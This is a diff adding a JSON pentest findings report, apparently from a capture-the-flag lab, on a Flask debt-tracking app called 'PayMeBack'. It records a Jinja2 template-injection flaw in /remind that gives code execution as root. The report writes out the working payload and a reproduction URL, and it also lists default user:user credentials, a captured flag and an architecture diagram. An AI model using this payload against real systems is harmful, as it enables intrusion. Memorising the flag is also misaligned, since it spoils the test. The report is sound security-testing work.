@@ -1,0 +1,43 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:30:24.496224+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "42988892-e9f1-476e-af88-3bbcf6df0818",
+      "timestamp": "2026-04-13T11:30:24.496107+00:00",
+      "title": "Server-Side Template Injection (SSTI) via /remind?date= \u2014 RCE as root",
+      "severity": "critical",
+      "target": "http://172.17.0.1:54331/remind",
+      "description": "The /remind endpoint takes a user-controlled 'date' parameter and injects it into a Jinja2 template string using Python's str.format() before passing it to render_template_string(). This allows an attacker to inject arbitrary Jinja2 template expressions, achieving Remote Code Execution as root. Credentials user:user (default) are required to reach the endpoint.",
+      "evidence": "SSTI PoC: GET /remind?date={{7*7}} \u2192 'Reminder will be sent on 49'\nRCE PoC: GET /remind?date={{config.__class__.__init__.__globals__['os'].popen('id').read()}} \u2192 'uid=0(root) gid=0(root) groups=0(root)'\nSource code read: cat /app/app.py confirmed render_template_string(message) where message = '...{}'.format(date)\nContainer hostname: 2592c48e318b, running as root\nFLAG: flag{7e0416f5-d2b9-4faf-94c2-de7a39664d4c}",
+      "tool_used": "manual/http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:54331/remind?date=%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('id').read()%7D%7D (with session cookie)",
+        "expected": "RCE output in page body"
+      }
+    },
+    {
+      "id": "4f69f4e7-ee75-41e2-8db0-4b068b0a4f85",
+      "timestamp": "2026-04-13T11:31:12.843105+00:00",
+      "title": "Default Credentials: user:user",
+      "severity": "high",
+      "target": "http://172.17.0.1:54331/login",
+      "description": "The application ships with hardcoded default credentials user:user that are created on first startup via before_request hook. Any unauthenticated user can log in with these credentials.",
+      "evidence": "POST /login with username=user&password=user returns HTTP 302 redirect to /transactions (successful login)",
+      "tool_used": "manual",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "1315f0b6-1ce0-4417-a18f-4629b5dda309",
+      "timestamp": "2026-04-13T11:31:18.830750+00:00",
+      "title": "PayMeBack Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Login[\"/login POST\\n user:user default creds\"]\n  Login --> Session[\"Flask Session Cookie\\nHS256 signed\"]\n  Session --> Transactions[\"/transactions GET\\nView debt records\"]\n  Session --> AddTx[\"/add_transaction POST\\nname, email, amount\"]\n  Session --> Remind[\"/remind?date= GET\\nSSTI RCE VECTOR\"]\n  Remind --> SSTI[\"render_template_string\\nstr.format injection\\nJinja2 SSTI\"]\n  SSTI --> RCE[\"RCE as root\\nuid=0\"]\n  AddTx --> DB[\"SQLite DB\\ninstance/database.db\"]\n  Transactions --> DB\n  DB --> Tables[\"user table\\ntransaction table\"]"
+    }
+  ]
+}
